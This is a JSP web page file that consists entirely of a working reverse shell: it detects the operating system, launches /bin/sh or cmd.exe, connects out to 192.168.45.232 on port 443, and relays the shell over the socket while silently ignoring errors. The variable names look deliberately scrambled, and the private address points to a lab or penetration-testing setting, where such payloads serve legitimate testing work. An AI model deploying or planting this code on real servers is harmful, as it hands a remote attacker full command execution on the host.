<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream uf;
    OutputStream rC;

    StreamConnector( InputStream uf, OutputStream rC )
    {
      this.uf = uf;
      this.rC = rC;
    }

    public void run()
    {
      BufferedReader xS  = null;
      BufferedWriter tFl = null;
      try
      {
        xS  = new BufferedReader( new InputStreamReader( this.uf ) );
        tFl = new BufferedWriter( new OutputStreamWriter( this.rC ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = xS.read( buffer, 0, buffer.length ) ) > 0 )
        {
          tFl.write( buffer, 0, length );
          tFl.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( xS != null )
          xS.close();
        if( tFl != null )
          tFl.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.45.232", 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
